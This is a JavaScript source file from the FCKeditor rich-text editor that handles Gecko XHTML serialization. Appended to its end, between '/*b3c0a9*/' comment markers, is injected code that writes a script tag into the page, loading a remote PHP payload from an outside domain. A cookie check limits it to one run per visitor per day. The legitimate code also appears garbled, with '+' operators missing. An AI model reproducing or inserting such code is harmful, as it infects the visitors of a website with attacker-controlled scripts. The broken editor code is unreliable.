/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckxhtml_gecko.js
 * 	Defines the FCKXHtml object, responsible for the XHTML operations.
 * 	Gecko specific.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKXHtml._GetMainXmlString = function()
{
	// Create the XMLSerializer.
	var oSerializer = new XMLSerializer() ;

	// Return the serialized XML as a string.
	// Due to a BUG on Gecko, the special chars sequence "#?-:" must be replaced with "&"
	// for the XHTML entities.
	return oSerializer.serializeToString( this.MainNode ).replace( FCKRegexLib.GeckoEntitiesMarker, '&' ) ;
}

// There is a BUG on Gecko... createEntityReference returns null.
// So we use a trick to append entities on it.
FCKXHtml._AppendEntity = function( xmlNode, entity )
{
	xmlNode.appendChild( this.XML.createTextNode( '#?-:'   entity   ';' ) ) ;
}

FCKXHtml._AppendAttributes = function( xmlNode, htmlNode, node )
{
	var aAttributes = htmlNode.attributes ;
	
	for ( var n = 0 ; n < aAttributes.length ; n   )
	{
		var oAttribute = aAttributes[n] ;
		
		if ( oAttribute.specified )
		{
			var sAttName = oAttribute.nodeName.toLowerCase() ;
			var sAttValue ;

			// Ignore any attribute starting with "_fck".
			if ( sAttName.startsWith( '_fck' ) )
				continue ;
			// There is a bug in Mozilla that returns '_moz_xxx' attributes as specified.
			else if ( sAttName.indexOf( '_moz' ) == 0 )
				continue ;
			// There are one cases (on Gecko) when the oAttribute.nodeValue must be used:
			//		- for the "class" attribute
			else if ( sAttName == 'class' )
				sAttValue = oAttribute.nodeValue ;
			// XHTML doens't support attribute minimization like "CHECKED". It must be trasformed to cheched="checked".
			else if ( oAttribute.nodeValue === true )
				sAttValue = sAttName ;
			else
				sAttValue = htmlNode.getAttribute( sAttName, 2 ) ;	// We must use getAttribute to get it exactly as it is defined.

			if ( FCKConfig.ForceSimpleAmpersand && sAttValue.replace )
				sAttValue = sAttValue.replace( /&/g, '___FCKAmp___' ) ;
			
			this._AppendAttribute( node, sAttName, sAttValue ) ;
		}
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
